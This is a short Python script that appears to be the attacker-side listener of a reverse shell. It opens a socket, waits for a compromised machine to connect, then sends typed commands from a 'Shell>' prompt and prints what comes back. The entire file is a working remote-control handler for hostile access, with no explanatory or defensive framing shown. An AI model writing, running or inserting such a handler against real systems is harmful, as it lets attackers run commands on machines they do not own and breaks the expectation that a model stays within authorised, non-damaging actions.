import socket
import sys

if len(sys.argv) != 3:
    print(f"Usage: python3 {sys.argv[0]} <listen_ip> <listen_port>")
    sys.exit(1)

listen_ip = sys.argv[1]
listen_port = int(sys.argv[2])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((listen_ip, listen_port))
s.listen(1)
print(f"[+] Listening on {listen_ip}:{listen_port} ...")

conn, addr = s.accept()
print(f"[+] Connection from {addr[0]}:{addr[1]}")

try:
    while True:
        cmd = input("Shell> ")
        if cmd.strip() == '':
            continue
        conn.send(cmd.encode())
        if cmd.lower() == 'exit':
            break
        output = conn.recv(4096)
        print(output.decode(errors='ignore'))
finally:
    conn.close()
    s.close() 